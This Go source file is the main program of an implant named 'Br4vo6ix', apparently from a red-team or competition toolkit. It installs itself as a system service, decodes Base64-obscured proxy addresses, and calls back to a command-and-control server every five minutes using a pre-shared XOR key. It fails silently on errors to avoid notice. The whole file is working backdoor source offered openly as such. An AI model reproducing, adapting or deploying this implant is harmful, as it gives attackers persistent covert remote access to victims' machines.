package main

import (
	"flag"
	"log"
	"strconv"
	"time"

	"github.com/kardianos/service"
)

var ENCODED_PROXY_IPS = "MTI3LjAuMC4xLDEyNy4wLjEuMQo=" // Base64 encoded csv list of IP addresses
var ENCODED_PROXY_PORTS = "NDQ0NCwxMzM3Cg=="           // Base64 encoded csv list of ports
var CALLBACK_TIME = "300"                              // The time in seconds between callbacks
var XOR_KEY = "abcd1234"                               // Pre-shared key used to encrypt all data
var SRV_NAME = "Br4vo6ix"                              // Name of the service to install
var SRV_DSP_NAME = "Br4vo6ix"                          // Display name of the service
var SRV_DESC = "Implant"                               // Description of the service
var BOX_IP = ""                                        // The IP address of the current machine (this gets set on startup)

var logger service.Logger

type program struct{}

func (p *program) Start(s service.Service) error {
	// Start should not block. Do the actual work async.
	go p.run()
	return nil
}

func (p *program) run() {
	proxyIps, err := DecodeProxyIps(ENCODED_PROXY_IPS)
	if err != nil {
		return // Fail silently
	}
	proxyPorts, err := DecodeProxyPorts(ENCODED_PROXY_PORTS)
	if err != nil {
		return // Fail silently
	}
	callbackTime, err := strconv.Atoi(CALLBACK_TIME)
	if err != nil {
		return // Fail silently
	}
	for {
		// Update current IP in-case of change
		BOX_IP = GetIP()
		// Attempt to call back to the C2 server (trying all proxies until success)
		AttemptCallback(proxyIps, proxyPorts)
		// Wait for next callback time
		time.Sleep(time.Duration(callbackTime) * time.Second)
	}
}

func (p *program) Stop(s service.Service) error {
	// Stop should not block. Return with a few seconds.
	return nil
}

func main() {
	svcFlag := flag.String("service", "", "Control the system service.")
	flag.Parse()

	svcConfig := &service.Config{
		Name:        SRV_NAME,
		DisplayName: SRV_DSP_NAME,
		Description: SRV_DESC,
	}

	prg := &program{}
	s, err := service.New(prg, svcConfig)
	if err != nil {
		log.Fatal(err)
	}
	logger, err = s.Logger(nil)
	if err != nil {
		log.Fatal(err)
	}

	if len(*svcFlag) != 0 {
		err := service.Control(s, *svcFlag)
		if err != nil {
			logger.Infof("Valid actions: %q\n", service.ControlAction)
			logger.Error(err)
		}
		return
	}

	err = s.Run()
	if err != nil {
		logger.Error(err)
	}
}
